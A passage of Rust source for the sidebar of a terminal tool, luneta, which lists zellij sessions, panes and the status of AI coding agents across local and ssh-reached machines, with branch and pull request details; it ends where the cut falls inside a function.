//! The sidebar: every session on the host, the panes in each, and what the
//! agent in each pane is doing, or the command its shell runs, as the daemon
//! says, beside the zellij luneta runs. A row takes zellij's client there, and
//! `▌` marks the pane it is on. `•` dots a pane where something finished since
//! you were last there, and one you marked unread, and `u` takes the dot away
//! or gives it. A click on the number of a row's pull request copies its link,
//! as `y p` does the highlighted row's, and `o` opens that in your browser. The
//! menu opens at its bottom, for the row highlighted, or
//! floats over zellij, for the pane zellij is on, and its Brief group asks
//! for a brief of the agents by that row, or that pane, as its `a` asks for
//! the ask box. Its title along the top is in the accent while it has the
//! keys, and dim while zellij or a box over zellij has them. Collapsed, it
//! keeps only what it counts of the dots, the agents at work and those in a
//! shell.
//!
//! The rows go oldest session first, until you move them, and each session's
//! panes in the order of their tabs, a bracket down the left joining those of
//! a tab that holds more than one. Each session has a colour of its own, as a
//! browser's group of tabs has, which its name sits on and its brackets are
//! drawn in. `v` selects the highlighted row's session, `j` and `k` grow the
//! selection among its machine's sessions, and `J` and `K` move the sessions
//! it holds, as a visual selection does in vim; and the mouse drags a session
//! by its row. A session moves among its machine's alone. On a machine's
//! header, `v` and the mouse move the machines so, each with every row under
//! it. The order and the colours are kept for every luneta, and the next.
//! `V` picks a pane, or its tab, for another session of its machine, which
//! `J` and `K` take it to and `Enter` moves it to, as the mouse drags it there
//! by its row, or a tab by its bracket: zellij moves no pane between
//! sessions, so what runs in it starts again there, as `carries` says.
//!
//! Over the sessions, a header for each machine: this one, by its host's
//! name, and each machine luneta's hosts file names, which lunetad watches
//! through ssh. They go this one first, and the others as the file names
//! them, until you move them, and each one's sessions as this one's do. A
//! machine folds as a session does, and `h` on a session folded already
//! folds its machine. One lunetad does not reach is a dimmed header that says
//! why in a word, and in the notes while it is highlighted. Another machine's
//! rows go there as this one's do, and their dots and folds are kept as this
//! one's are.

use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
use std::fmt;
use std::num::{NonZeroU32, NonZeroU64};
use std::ops::Range;
use std::time::{Duration, Instant, SystemTime};

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers, MouseButton, MouseEvent, MouseEventKind};
use fuzzy_matcher::FuzzyMatcher;
use fuzzy_matcher::skim::{SkimMatcherV2, SkimScoreConfig};
use luneta_protocol::git::{Changed, Changes, Head, Upstream, WorkTree};
use luneta_protocol::github::{PullRequest, State, Verdict};
use luneta_protocol::said::Said;
use luneta_protocol::shell::Ending;
use luneta_protocol::{tab, unread};
use lunetad::api::agent::Status as Reported;
use lunetad::api::remote::unreached::Stopped;
use lunetad::api::remote::{self, Reached};
use lunetad::api::shell::Doing;
use lunetad::api::{
    Agent, Client, Front, Harness, Host, Pane, Saying, Session, Shell, Status, UnreadFile,
};
use lunetad::asks::User;
use lunetad::links;
use lunetad::carries::{self, Carry, Lands, Moved, Planned, Whole};
use lunetad::prunes;
use lunetad::seats::seated;
use lunetad::transcripts::SessionId;
use lunetad::turns::{IntoPanes, OtherTab, Turn};
use lunetad::{log, Destination, Directory};
use ratatui::buffer::Buffer;
use ratatui::layout::{Position, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use unicode_segmentation::UnicodeSegmentation;
use unicode_width::{UnicodeWidthChar, UnicodeWidthStr};

use crate::agents::{self, Kept};
use crate::alerts::{self, Reach};
use crate::aloud;
use crate::brief::{Brief, Note, Over, Transcript};
use crate::checks;
use crate::close::{self, Act, Deletes, Plan, Scope, Seat, Subject, Untold};
use crate::folds::{Fold, Folds};
use crate::gruvbox;
use crate::icons;
use crate::ledger::{self, Key};
use crate::live::Lists;
use crate::machines::Machine;
use crate::menu::{
    self, Briefed, Choice, Command, Did, Done, Hint, Menu, Opening, Opens, PaneRow, Ran, Target,
    Top, Wants,
};
use crate::news::News;
use crate::order::{Colour, Order};
use crate::own::{Look, Looked, OwnClient, Unplaced};
use crate::picker::{Here, Listing, Live, Runs, Seated, Shown};
use crate::printed::Printed;
use crate::prune;
use crate::pull::{Found, Kind, Link, Others, Wanted, Work, Worked};
use crate::skills::{Name, Skill};
use crate::spots::{Drawn, Keyed, Spots};
use crate::sweep::{cells, Page, Sweep};
use crate::zellij::{Closes, Open, SessionName, Starts, Tab, Within};

/// How many columns the sidebar takes until its edge is dragged.
pub const COLUMNS: u16 = 32;

/// How long the notes say a pull request's link was copied, where no key takes
/// that back sooner: a click on its number can leave the keys with zellij.
const COPIED_SHOWS: Duration = Duration::from_secs(3);

/// The fewest columns the sidebar is dragged to, where the terminal has twice
/// as many: enough for a session's name on its row.
pub const NARROWEST: u16 = 16;

/// How many columns the sidebar takes collapsed: a count's glyph, two digits
/// of it, and the edge.
pub const COLLAPSED: u16 = 4;

/// What marks the pane luneta's zellij is on, in its first column, whether
/// the sidebar has the focus or not.
const HERE_MARK: &str = "▌";
/// The dot of a pane where something finished since you were last there, or
/// that you marked unread, before its mark; and on a folded session's row, of
/// one of its panes.
const NEW: &str = "•";
const UNFOLDED: &str = "▾";
const FOLDED: &str = "▸";
const RULE: &str = "─";
/// What runs along a machine's header, where a session's row has `RULE`.
const MACHINE_RULE: &str = "═";
/// Nerd Fonts' `fa-desktop`, before a machine's name on its header, one
/// column wide as the icons of panes are.
const COMPUTER: &str = "\u{f108}";
/// What runs down the sidebar's last column, its edge, between it and zellij,
/// open or collapsed.
const EDGE: &str = "│";
/// What joins the panes of a tab that holds more than one, down the column
/// after the mark of the pane luneta's zellij is on: from the first line of
/// the first pane, by each line between, to the last line of the last.
const BRACKET_TOP: &str = "╭";
const BRACKET_SIDE: &str = "│";
const BRACKET_FOOT: &str = "╰";
/// The column of the sidebar the bracket is on, after the mark's: a press on
/// either lifts the tab, as the mark is a cell wide and a hand is not.
const BRACKET_COLUMN: u16 = 1;
const SPINNER: [&str; 10] = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"];
/// How long the spinner shows each of its frames.
pub const SPIN: Duration = Duration::from_millis(100);
/// How long what the mouse lifted is held on the first line of the rows, or
/// on their last, for each line they scroll under it.
pub const SCROLL: Duration = Duration::from_millis(60);

/// The colour of what wants you: an agent that waits for you, and the session
/// luneta's zellij is in; and of the sidebar's title while it has the keys.
pub const ACCENT: Color = gruvbox::PURPLE;
/// The colour of a session's name where it has no colour of its own, as in
/// the picker.
pub const NAME: Color = gruvbox::AQUA;
/// The colour of an agent at work, and of what the rule over a menu or the
/// search says at its right.
pub const TAG: Color = gruvbox::YELLOW;
/// The colour of what went wrong: the notes at the bottom that say so, the
/// box over zellij that says so for the menu there, and the rule of the
/// sidebar collapsed, which has no room for them, while the daemon does not
/// answer.
pub const ERROR: Color = gruvbox::RED;
/// The background of the highlight while the sidebar has the focus, on the
/// row the keys took it to.
pub const LIT: Color = gruvbox::BG2;
/// The background of the highlight while it rests on your pane, the sidebar
/// without the focus: a step softer, as `▌` marks that row already.
const RESTING: Color = gruvbox::BG1;

/// How many columns a mark takes: one, as each glyph of `Mark` does. Each
/// pane's row keeps that many for one, whether it has one or not.
const MARK: usize = 1;

/// The column a pane's label starts at, and the branch under it: past the
/// indent, the mark and the icon, and a space after each of those two.
const LABEL: usize = 3 + MARK + 1 + icons::WIDTH + 1;

/// How long a command runs before its row says it runs, and says how it
/// ended once it does: an `ls` is no news.
const LONG: Duration = Duration::from_secs(1);

/// What the sidebar says as the menu cannot float over zellij for the pane
/// zellij is on, as it does not know which that is: it has yet to hear.
const NO_HERE_PANE: &str = "menu: luneta does not know yet which pane zellij is on; try again in a \
                            moment";
/// luneta cannot tell its zellij's client from the others of the session.
const UNSURE_PANE: &str = "menu: luneta cannot tell yet which of the session's clients is its own; \
                           go to a pane from the sidebar";
/// zellij has the focus on a plugin's pane.
const PLUGIN_PANE: &str = "menu: zellij is on a plugin's pane; the menu opens over a terminal's";
/// The daemon lists more than one session of the name zellij is in.
const TWIN_SESSIONS: &str = "menu: lunetad lists more than one session of the name zellij is in, \
                             and luneta cannot tell which it is";

/// A session as the sidebar tells it from another of its name: zellij
/// versions with sockets of their own can each run one under it. Its start
/// and its socket tell it from every other.
#[derive(Clone, Debug, PartialEq, Eq, Hash)]
pub struct Listed {
    name: SessionName,
    /// The session, as the news keeps it, which says when it started.
    kept: ledger::Session,
}

impl Listed {
    /// `session`, or none for one with no start or no socket, as a daemon of
    /// another build's lists, or with a start no file of the news can be
    /// named for, before 1970, or with a name zellij refuses, which luneta
    /// can neither go to nor fold.
    fn of(session: &Session) -> Option<Self> {
        let name = SessionName::running(&session.name).ok()?;
        let started = SystemTime::try_from(session.started_at?).ok()?;
        let kept = ledger::Session::new(started, NonZeroU64::new(session.socket)?)?;
        Some(Listed { name, kept })
    }

    pub fn name(&self) -> &SessionName {
        &self.name
    }

    /// When its server made its socket, which tells it from a session that
    /// takes its name once it has ended.
    pub fn started(&self) -> SystemTime {
        self.kept.started()
    }

    /// Its pane `pane`, as the news keeps it.
    fn key(&self, pane: u32) -> Key {
        Key { session: self.kept, pane }
    }

    /// It, as a move to another session names one.
    fn seat(&self) -> carries::Seat {
        carries::Seat { session: self.name.clone(), started: self.started() }
    }

    /// A session of the tests', whose socket is the first there is.
    #[cfg(test)]
    pub fn new(name: &str, started: SystemTime) -> Self {
        let kept = ledger::Session::new(started, NonZeroU64::MIN).unwrap();
        Listed { name: SessionName::parse(name).unwrap(), kept }
    }
}

/// The session luneta sent its zellij to itself, which stands for the one
/// zellij is in until zellij titles luneta's terminal once it is there.
/// zellij sends a title only as it changes, in a tab, whichever client it
/// goes to: a client that comes to a tab whose title went to another, or to
/// it before, gets none, and its terminal keeps the last session's.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Sent {
    /// Until the client is there, a title of another session is of the one it
    /// is leaving.
    Going {
        session: String,
        /// The session the client leaves for this one, which it may be in still
        /// until it is there. None for one that starts there, as luneta's first
        /// does, and one that takes the place of a client that ended.
        from: Option<Leaving>,
        /// The number of the look that finds the client there, by which what
        /// comes back of a go luneta sent it on before is told from this one's.
        look: Option<u64>,
    },
    Landed { session: String },
}

impl Sent {
    fn session(&self) -> &str {
        match self {
            Sent::Going { session, .. } | Sent::Landed { session } => session,
        }
    }
}

/// The session luneta's zellij leaves for the one it was sent to.
#[derive(Clone, Debug, PartialEq, Eq)]
struct Leaving {
    session: String,
    /// Whether it ends once the client has left it, as where the menu
    /// deletes the session luneta's zellij is in. The sidebar says so for as
    /// long as the go lasts, and no longer: zellij not taking the client
    /// there, or the client ending on its way, ends the go.
    ends: bool,
}

/// What a row stands for, by which the highlight keeps to it as rows come and
/// go.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Place {
    Session(Listed),
    Pane(PanePlace),
}

impl Place {
    /// The name of its session. zellij's CLI goes to a session by its name
    /// alone, and to its own version's of two that share one.
    pub fn session(&self) -> &str {
        self.listed().name.as_str()
    }

    pub fn pane(&self) -> Option<u32> {
        match self {
            Place::Session(_) => None,
            Place::Pane(place) => Some(place.pane),
        }
    }

    /// Its session.
    pub fn listed(&self) -> &Listed {
        match self {
            Place::Session(session) | Place::Pane(PanePlace { session, .. }) => session,
        }
    }
}

/// A pane of a session, by which an agent is told from the others, and the
/// pane luneta's zellij is on.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PanePlace {
    pub session: Listed,
    pub pane: u32,
}

/// The agent in the pane luneta's zellij is on, that you can name a skill to:
/// where it is, the directory its skills are found for, and the harness it
/// runs in, which finds them and spells them.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct HereAgent {
    pub on: Machine,
    pub session: SessionName,
    pub pane: u32,
    pub dir: String,
    pub harness: agents::Harness,
}

/// What a row stands for, by which the highlight keeps to it as rows come and
/// go: a machine's header, or a session or a pane of this machine's, or of
/// another's, where luneta's zellij goes.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Spot {
    Machine(Machine),
    Local(Place),
    Remote(Destination, Place),
}

impl Spot {
    /// `place`, of `machine`.
    fn on(machine: &Machine, place: Place) -> Spot {
        match machine {
            Machine::Local => Spot::Local(place),
            Machine::Remote(destination) => Spot::Remote(destination.clone(), place),
        }
    }

    fn machine(&self) -> Machine {
        match self {
            Spot::Machine(machine) => machine.clone(),
            Spot::Local(_) => Machine::Local,
            Spot::Remote(destination, _) => Machine::Remote(destination.clone()),
        }
    }

    /// Its session, or its pane, but for a machine's header.
    fn place(&self) -> Option<&Place> {
        match self {
            Spot::Machine(_) => None,
            Spot::Local(place) | Spot::Remote(_, place) => Some(place),
        }
    }

    /// Its session's row, but for a machine's header.
    fn session(&self) -> Option<Spot> {
        let session = Place::Session(self.place()?.listed().clone());
        Some(Spot::on(&self.machine(), session))
    }
}

/// What goes on in a pane, as its row marks it: what its agent is doing, or
/// the command its shell runs, or ran last.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Mark {
    /// An agent that waits for you, or a command that waits for you to type.
    Waiting,
    /// An agent done, which you have seen since it finished, or see: it is
    /// in the pane luneta's zellij is on.
    Idle,
    /// An agent that finished since you were last in its pane.
    Finished,
    /// An agent at work, or a command.
    Busy,
    Shell,
    /// A word the daemon passed on as Claude Code wrote it, by its initial as
    /// a capital, which takes the one column a mark does.
    Other(char),
    /// An agent that says nothing, or nothing a mark can show in its column.
    Unreported,
    /// A command that ended with an exit status of 0.
    Passed,
    /// A command that ended with any other.
    Failed,
    /// A command that ended, its shell not saying how, as fish does not after
    /// `fg`.
    Ran,
}

impl Mark {
    fn of(agent: &Agent) -> Self {
        match &agent.status {
            Some(Reported::KnownStatus(known)) => match Status::try_from(*known) {
                Ok(Status::Waiting) => Mark::Waiting,
                Ok(Status::Idle) => Mark::Idle,
                Ok(Status::Busy) => Mark::Busy,
                Ok(Status::Shell) => Mark::Shell,
                Ok(Status::Unspecified) | Err(_) => Mark::Unreported,
            },
            Some(Reported::OtherStatus(word)) => {
                initial(word).map_or(Mark::Unreported, Mark::Other)
            },
            None => Mark::Unreported,
        }
    }

    /// Whether it says that something finished since you were last in its
    /// pane: an agent, or a command, which shows how it ended until then.
    fn is_news(&self) -> bool {
        matches!(self, Mark::Finished | Mark::Passed | Mark::Failed | Mark::Ran)
    }

    /// Its glyph, which the spinner shows at `frame`, and its style.
    pub fn glyph(&self, frame: usize) -> (String, Style) {
        let style = Style::new();
        match self {
            Mark::Waiting => ("●".to_owned(), style.fg(ACCENT).add_modifier(Modifier::BOLD)),
            Mark::Idle => ("✓".to_owned(), style.add_modifier(Modifier::DIM)),
            Mark::Finished | Mark::Passed => {
                ("✓".to_owned(), style.fg(gruvbox::GREEN).add_modifier(Modifier::BOLD))
            },
            Mark::Busy => (SPINNER[frame].to_owned(), style.fg(TAG)),
            Mark::Shell => ("$".to_owned(), style.add_modifier(Modifier::DIM)),
            Mark::Other(letter) => (letter.to_string(), style.fg(TAG)),
            Mark::Unreported => ("?".to_owned(), style.add_modifier(Modifier::DIM)),
            Mark::Failed => ("✗".to_owned(), style.fg(gruvbox::RED).add_modifier(Modifier::BOLD)),
            Mark::Ran => ("$".to_owned(), style),
        }
    }
}

/// The initial of `word` as a capital, if it takes one column: the first
/// letter of a capital of two, as `ß`'s `SS`. A letter two wide, or a mark
/// that sits on the letter before it, would put the label off its column.
fn initial(word: &str) -> Option<char> {
    let initial = word.chars().next()?.to_uppercase().next()?;
    (initial.width() == Some(MARK)).then_some(initial)
}

/// What a pane's row marks, as it shows it.
#[derive(Clone, Debug, PartialEq, Eq)]
struct Marked {
    mark: Mark,
    /// Since when it has been doing what it does, or since it ended.
    since: Option<SystemTime>,
}

impl Marked {
    fn of(agent: &Agent) -> Self {
        let since = agent.status_since.and_then(|at| at.try_into().ok());
        Marked { mark: Mark::of(agent), since }
    }

    /// The mark of the command `shell` runs, or ran last, at `now`, and the
    /// command. One that runs has the spinner, or the dot of an agent that
    /// waits for you while it waits for you to type, once it has run for
    /// `LONG`; and one that ended says how, if it ran that long. One that takes
    /// the terminal over has none while you use it, nor has a job stopped.
    fn of_shell(shell: &Shell, now: SystemTime) -> Option<(Self, &str)> {
        let (mark, since, command) = match shell.doing.as_ref()? {
            Doing::Going(going) => {
                let since = told(going.since)?;
                if now < since.checked_add(LONG)? {
                    return None;
                }
                let mark = match Front::try_from(going.front) {
                    Ok(Front::Working) => Mark::Busy,
                    Ok(Front::Asking) => Mark::Waiting,
                    Ok(Front::Interactive | Front::Unspecified) | Err(_) => return None,
                };
                (mark, since, going.command.as_str())
            },
            Doing::Ended(ended) => {
                if Duration::try_from(ended.took?).ok()? < LONG {
                    return None;
                }
                let mark = match ended.ending.as_ref().map(Ending::of_api) {
                    Some(Ending::Exited(0)) => Mark::Passed,
                    Some(Ending::Exited(_)) => Mark::Failed,
                    Some(Ending::Resumed) | None => Mark::Ran,
                };
                (mark, told(ended.at)?, ended.command.as_str())
            },
            Doing::Stopped(_) | Doing::Ready(()) => return None,
        };
        Some((Marked { mark, since: Some(since) }, command))
    }

    /// When the command it marks ended, if it did.
    fn ended(&self) -> Option<SystemTime> {
        match self.mark {
            Mark::Passed | Mark::Failed | Mark::Ran => self.since,
            _ => None,
        }
    }
}

/// What a pane's row shows of what goes on in it.
struct Shows<'a> {
    /// What its agent is doing, or else the command its shell runs, or ran.
    marked: Option<Marked>,
    /// That command, by which its row is named.
    ran: Option<&'a str>,
    /// Whether you marked it unread.
    unread: bool,
}

impl Shows<'_> {
    /// Whether its row has the dot.
    fn dotted(&self) -> bool {
        dotted(self.unread, self.marked.as_ref())
    }
}

/// Whether a pane's row has the dot: something finished in it since you were
/// last there, as its mark says, or you marked it unread.
fn dotted(unread: bool, marked: Option<&Marked>) -> bool {
    unread || marked.is_some_and(|marked| marked.mark.is_news())
}

/// The dot of `NEW`, and its style.
fn dot() -> Span<'static> {
    Span::styled(NEW, Style::new().fg(ACCENT).add_modifier(Modifier::BOLD))
}

/// A moment the shell hook said, which it counts in whole seconds: the last
/// moment of its second, so that a command never ran longer than it did.
fn told(at: Option<impl TryInto<SystemTime>>) -> Option<SystemTime> {
    at?.try_into().ok()?.checked_add(Duration::from_millis(999))
}

/// What `shell`, a shell with luneta's hook, said it ran, for the menu.
fn ran(shell: &Shell) -> Ran {
    let said = |command: &String| Said::new(command.clone());
    let ran = match shell.doing.as_ref() {
        Some(Doing::Going(going)) => said(&going.command).map(Ran::Going),
        Some(Doing::Stopped(stopped)) => said(&stopped.command).map(Ran::Stopped),
        Some(Doing::Ended(ended)) => ended_last(ended).map(Ran::Ended),
        Some(Doing::Ready(())) => Some(Ran::Ready),
        // A daemon newer than this luneta's.
        None => None,
    };
    ran.unwrap_or(Ran::Unknown)
}

/// The command a shell said it ran last, which ended, for the menu. None of
/// one with no words, or with no moment it ended, which lunetad always says.
fn ended_last(ended: &lunetad::api::shell::Ended) -> Option<menu::Ended> {
    let command = Said::new(ended.command.clone())?;
    let at = SystemTime::try_from(ended.at?).ok()?;
    let ending = ended.ending.as_ref().map(Ending::of_api);
    Some(menu::Ended { command, ending, at })
}

/// When the command going in `shell` will have run for `LONG`.
fn long_at(shell: &Shell) -> Option<SystemTime> {
    match shell.doing.as_ref()? {
        Doing::Going(going) => told(going.since)?.checked_add(LONG),
        Doing::Ended(_) | Doing::Stopped(_) | Doing::Ready(()) => None,
    }
}

/// A row of the sidebar.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Row {
    /// A machine's header, over its sessions.
    Machine {
        machine: Machine,
        /// What it goes by: this machine's host's name, or another's
        /// destination, as luneta's hosts file spells it.
        name: String,
        heads: Heads,
    },
    Session {
        machine: Machine,
        session: Listed,
        /// The characters of its name a search found.
        hits: Vec<usize>,
        under: Under,
        /// Whether luneta's zellij is in it.
        here: bool,
        /// Its colour, which its name sits on.
        colour: Color,
        /// How many of its agents wait for you, whether one of its panes has
        /// the dot, and whether one is at work.
        waiting: usize,
        dot: bool,
        busy: bool,
    },
    Pane {
        machine: Machine,
        session: Listed,
        pane: u32,
        /// Whether luneta's zellij is on it.
        here: bool,
        /// Whether you marked it unread.
        unread: bool,
        marked: Option<Marked>,
        /// The icon of what runs in it, if that has one.
        icon: Option<&'static str>,
        label: String,
        /// The characters of its label a search found.
        hits: Vec<usize>,
        /// The branch checked out where it works, if one is.
        checkout: Option<Checkout>,
        /// Where it sits among the panes listed of its tab, if it shares it,
        /// and the colour of its session, which the bracket is drawn in.
        bracket: Option<(Bracket, Color)>,
        /// Whether what is being read aloud comes from it.
        speaks: bool,
    },
}

/// Where a pane's row sits among the rows of the panes that share its tab,
/// which a bracket down the gutter joins: the first, the last, or one between.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Bracket {
    First,
    Inner,
    Last,
}

impl Bracket {
    /// Where the pane `at` of the `count` listed of its tab sits among them:
    /// none for a pane alone in its tab.
    fn of(at: usize, count: usize) -> Option<Bracket> {
        match at {
            _ if count < 2 => None,
            0 => Some(Bracket::First),
            _ if at + 1 == count => Some(Bracket::Last),
            _ => Some(Bracket::Inner),
        }
    }
}

/// The branch checked out where a pane works, as its row shows it under its
/// label.
#[derive(Clone, Debug, PartialEq, Eq)]
struct Checkout {
    branch: String,
    /// How its work tree stands, as starship shows it.
    status: String,
    /// How many lines changed on the branch, against the branch its
    /// repository takes as its default. None where nothing changed, on that
    /// branch itself, or where its daemon is older than the count.
    changed: Option<Changed>,
    /// Its pull request, if it has one to show.
    pull_request: Option<Numbered>,
}

/// How many lines changed on a branch, as its branch's line shows them:
/// `+120 -34`, the added in green and the deleted in red, as diffs are
/// coloured, and either left out where it is none.
fn changed_shown(changed: Changed) -> (Vec<Span<'static>>, usize) {
    let (added, deleted) = (changed.added(), changed.deleted());
    let mut spans = Vec::new();
    if added > 0 {
        spans.push(Span::styled(format!("+{added}"), Style::new().fg(gruvbox::GREEN)));
    }
    if deleted > 0 {
        if added > 0 {
            spans.push(Span::raw(" "));
        }
        spans.push(Span::styled(format!("-{deleted}"), Style::new().fg(gruvbox::RED)));
    }
    let width = spans.iter().map(Span::width).sum();
    (spans, width)
}

/// A pull request, as its branch's line shows it: its number, in the colour
/// of its state, and after it a mark for what its checks come to, while it is
/// open.
#[derive(Clone, Debug, PartialEq, Eq)]
struct Numbered {
    number: Number,
    colour: Color,
    checks: Option<Verdict>,
}

/// A pull request's number on its branch's line: its link says it where it has
/// one, so that what the row shows and what a click copies are of one pull
/// request.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Number {
    Linked(Box<Link>),
    /// Its daemon says no link of this number on GitHub: older than the link,
    /// or on another host, or with what does not read as one.
    Unlinked(NonZeroU32),
}

impl Numbered {
    /// How its branch's line shows it.
    fn shown(&self) -> String {
        match &self.number {
            Number::Linked(link) => link.tab(),
            Number::Unlinked(number) => format!("#{number}"),
        }
    }

    /// Its link, where it has one.
    fn link(&self) -> Option<&Link> {
        match &self.number {
            Number::Linked(link) => Some(link),
            Number::Unlinked(_) => None,
        }
    }
}

impl Row {
    fn spot(&self) -> Spot {
        match self {
            Row::Machine { machine, .. } => Spot::Machine(machine.clone()),
            Row::Session { machine, session, .. } => {
                Spot::on(machine, Place::Session(session.clone()))
            },
            Row::Pane { machine, session, pane, .. } => {
                Spot::on(machine, Place::Pane(PanePlace { session: session.clone(), pane: *pane }))
            },
        }
    }

    /// How many lines it takes: a pane in a repository has its branch under it.
    fn height(&self) -> usize {
        match self {
            Row::Pane { checkout: Some(_), .. } => 2,
            _ => 1,
        }
    }

    /// Whether the highlight stops on it: a pane, or a session that stands in
    /// for its panes, folded or with none to list, and a machine's header
    /// that stands in for its sessions so, or for none lunetad has. A
    /// session's row heads its panes, and is no place to go, nor is a
    /// machine's header that heads its sessions.
    fn stops(&self) -> bool {
        match self {
            Row::Machine { heads: Heads::Sessions { under, .. }, .. }
            | Row::Session { under, .. } => *under != Under::Rows,
            Row::Machine { heads: Heads::Away(_), .. } | Row::Pane { .. } => true,
        }
    }
}

/// What a session's row has under it, or a machine's header.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Under {
    /// Its rows: a session's panes, or a machine's sessions, or the ones of
    /// them a search finds.
    Rows,
    /// None, as it is folded.
    Folded,
    /// None, as zellij has listed none, or lunetad has none of the machine.
    Empty,
}

/// What a machine's header stands over.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Heads {
    /// None of its sessions, as lunetad has none of them to say, for this
    /// reason.
    Away(Away),
    /// Its sessions, as lunetad says them.
    Sessions {
        under: Under,
        /// How many of its agents wait for you, whether one of its panes has
        /// the dot, and whether one is at work.
        waiting: usize,
        dot: bool,
        busy: bool,
        /// Whether luneta's zellij is in one of its sessions.
        here: bool,
    },
}

/// The sessions of another machine's that luneta's zellij may go on in,
/// newest first, one at least, as `Sidebar::refuges_away` lists them; or
/// why it goes on in none of them.
pub type Refuges = Result<Vec<SessionName>, NoRefuge>;

/// Why luneta's zellij goes on in none of another machine's sessions.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum NoRefuge {
    /// lunetad listed none of them when it last said.
    NoneListed,
    /// Each of them may hold luneta's own terminal, as `may_hold` says.
    Held,
    /// The first ssh to it runs.
    Reaching,
    /// lunetad does not reach it, for what this says in a word.
    Unreached(&'static str),
}

impl fmt::Display for NoRefuge {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            NoRefuge::NoneListed => f.write_str("lunetad lists none of its sessions"),
            NoRefuge::Held => f.write_str("each of its sessions may hold luneta's own terminal"),
            NoRefuge::Reaching => f.write_str("lunetad is reaching it"),
            NoRefuge::Unreached(word) => write!(f, "lunetad does not reach it: {word}"),
        }
    }
}

/// Why a machine's header lists none of its sessions: lunetad has none of
/// them to say.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Away {
    /// The first ssh to it runs.
    Reaching,
    /// ssh failed to reach lunetad there since `since`, or lost it: what
    /// stopped it, in a word for the header, and why, in words for the notes.
    Unreached { since: Option<SystemTime>, word: &'static str, why: String },
}

impl Away {
    fn of(unreached: &remote::Unreached) -> Away {
        let word = match unreached.stopped {
            Some(Stopped::Ended(remote::unreached::Ended { code: Some(255) })) => "unreachable",
            Some(Stopped::Ended(remote::unreached::Ended { code: Some(127) })) => "no luneta there",
            Some(Stopped::Ended(remote::unreached::Ended { code: Some(1) })) => {
                "luneta there failed"
            },
            Some(Stopped::Ended(_)) => "ssh ended",
            Some(Stopped::Unstarted(())) => "ssh did not start",
            Some(Stopped::Said(())) => "its login prints",
            Some(Stopped::Silent(())) => "no answer",
            Some(Stopped::Lost(())) => "lost",
            Some(Stopped::Unwatched(())) => "not watched",
            // A newer daemon's.
            None => "unreached",
        };
        let since = unreached.since.and_then(|at| SystemTime::try_from(at).ok());
        Away::Unreached { since, word, why: unreached.why.clone() }
    }

    /// What the header says of it, and since when, where that is known.
    fn said(&self) -> (&'static str, Option<SystemTime>) {
        match self {
            Away::Reaching => ("reaching…", None),
            Away::Unreached { since, word, .. } => (word, *since),
        }
    }
}

/// What a machine's daemon says of it, as its rows show it: this one's host,
/// or another's, which comes without its version or its remotes.
struct Seen<'a> {
    sessions: &'a [Session],
    agents: &'a [Agent],
    work_trees: &'a [lunetad::api::WorkTree],
    pull_requests: &'a [lunetad::api::PullRequest],
    unread_sockets: Option<u32>,
    /// How many of Claude Code's session files its daemon cannot read, and
    /// where the process of each runs, as far as it can tell.
    unread: u32,
    unread_files: &'a [UnreadFile],
    /// What it last said to read aloud.
    sayings: &'a [Saying],
}

impl Seen<'_> {
    /// Where the agents of the session files its daemon cannot read run, as
    /// `luneta_protocol::unread::seats` tells them.
    fn unread_seats(&self) -> Result<Vec<(&str, u32)>, unread::Unplaced> {
        unread::seats(self.unread, self.unread_files)
    }
}

/// Each machine lunetad says of: this one, of which it always says; the
/// others, in the order of luneta's hosts file, with what each one's daemon
/// says of it, or why it says nothing; and how many of those it says of are
/// left out, as lunetad never sends them, but one of another build might:
/// one whose destination does not read, and one named a second time.
struct Machines<'a> {
    here: Seen<'a>,
    others: Vec<(Destination, Result<Seen<'a>, Away>)>,
    left_out: usize,
}

impl<'a> Machines<'a> {
    /// Each, this one first, with what its daemon says of it, or why it
    /// says nothing.
    fn each(self) -> impl Iterator<Item = (Machine, Result<Seen<'a>, Away>)> {
        let others = self.others.into_iter();
        let others = others.map(|(destination, seen)| (Machine::Remote(destination), seen));
        std::iter::once((Machine::Local, Ok(self.here))).chain(others)
    }
}

/// A machine, as the rows list it: what its daemon says of it, or why it
/// says nothing, and its sessions, each with what tells it from another of
/// its name, in the order of their rows.
struct Arranged<'a> {
    machine: Machine,
    reached: Result<Seen<'a>, Away>,
    sessions: Vec<(Listed, &'a Session)>,
}

impl<'a> Machines<'a> {
    /// Each, in the order of the rows, as `order` has them: the machines it
    /// has first, and the rest as `each` goes, each with its sessions, those
    /// `order` has first, and the rest oldest first. And how many of their
    /// sessions `Listed` leaves out.
    fn arranged(self, order: &Order) -> (Vec<Arranged<'a>>, usize) {
        let mut unlisted = 0;
        let mut arranged: Vec<Arranged<'a>> = self
            .each()
            .map(|(machine, reached)| {
                let mut sessions = match &reached {
                    Ok(seen) => {
                        let (sessions, left_out) = oldest_first(seen.sessions);
                        unlisted += left_out;
                        sessions
                    },
                    Err(_) => Vec::new(),
                };
                order.sessions(&machine, &mut sessions, |(listed, _)| listed.name.as_str());
                Arranged { machine, reached, sessions }
            })
            .collect();
        order.machines(&mut arranged, |it| &it.machine);
        (arranged, unlisted)
    }
}

/// Each machine lunetad says of in `host`, as `Machines` has them.
fn machines(host: &Host) -> Machines<'_> {
    let here = Seen {
        sessions: &host.sessions,
        agents: &host.agents,
        work_trees: &host.work_trees,
        pull_requests: &host.pull_requests,
        unread_sockets: host.unread_sockets,
        unread: host.unread,
        unread_files: &host.unread_files,
        sayings: &host.sayings,
    };
    let mut others = Vec::new();
    let mut named = HashSet::new();
    let mut left_out = 0;
    for remote in &host.remotes {
